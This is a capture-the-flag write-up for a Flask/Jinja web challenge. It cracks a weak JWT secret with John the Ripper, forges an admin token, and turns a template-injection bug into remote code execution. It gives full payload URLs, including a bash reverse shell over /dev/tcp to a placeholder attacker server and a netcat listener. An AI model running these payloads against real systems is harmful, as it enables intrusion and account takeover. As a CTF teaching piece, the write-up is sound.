<h1>Template Shack</h1>

<p>Author: <a href="https://github.com/roerohan">roerohan</a></p>

<h1>Requirements</h1>

<ul>
<li>JWT</li>
<li>John The Ripper</li>
</ul>

<h1>Source</h1>

<p>```
Check out the coolest web templates online!</p>

<p>Connect here:
http://jh2i.com:50023
```</p>

<h1>Exploitation</h1>

<p>When you visit the website, you find that there's a cookie containing a JWT. It's hashed using <code>HS256</code>. We used <code>rockyou.txt</code> to bruteforce the JWT secret, using John The Ripper.</p>

<p><code>
$ john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
</code></p>

<p>The secret is <code>supersecret</code>. Using this, you can make a JWT with <code>username: admin</code>.</p>

<p><code>
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.Ykqid4LTnSPZtoFb11H-_2q-Vo32g4mLpkEcajK0H7I
</code></p>

<p>Now, add this to your cookie. You are logged in as admin. Visit some random route starting with <code>/admin/</code> which throws a 404. You can see there's scope for template injection in the 404 page.</p>

<p><code>
http://jh2i.com:50023/template/admin/%7B%7B().__class__.__bases__[0].__subclasses__()%7D%7D
</code></p>

<p>You can climb up the Python MRO using the <code>__class__</code> and <code>__bases__</code>, etc. This way you can find a list of all the classes you can use. On index 405, you see <code>subprocess.Popen</code>.</p>

<p><code>
http://jh2i.com:50023/template/admin/%7B%7B().__class__.__bases__[0].__subclasses__()[405]%7D%7D
</code></p>

<p>This shows <code>/template/admin/&lt;class 'subprocess.Popen'&gt;</code> on the website.</p>

<p>Now, you can use this to spawn a reverse shell. </p>

<p><code>
http://jh2i.com:50023/template/admin/%7B%7B().__class__.__bases__[0].__subclasses__()[405](['bash -c %22bash -i %3E&amp; /dev/tcp/yourserverip/yourport 0%3E&amp;1%22'], shell=True)%7D%7D
</code></p>

<blockquote>
  <p>Note: Replace yourserverip and yourport.</p>
</blockquote>

<p>Start a <code>netcat</code> listener on your server at the specified port. </p>

<p>You get a shell!</p>

<p><code>
$ nc -lp 8000
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
user@272108e56147:~$ ls
ls
flag.txt
main.py
posts.py
requirements.txt
templates
user@272108e56147:~$ cat flag.txt
cat flag.txt
flag{easy_jinja_SSTI_RCE}
</code></p>

<p>The flag is:</p>

<p><code>
flag{easy_jinja_SSTI_RCE}
</code></p>
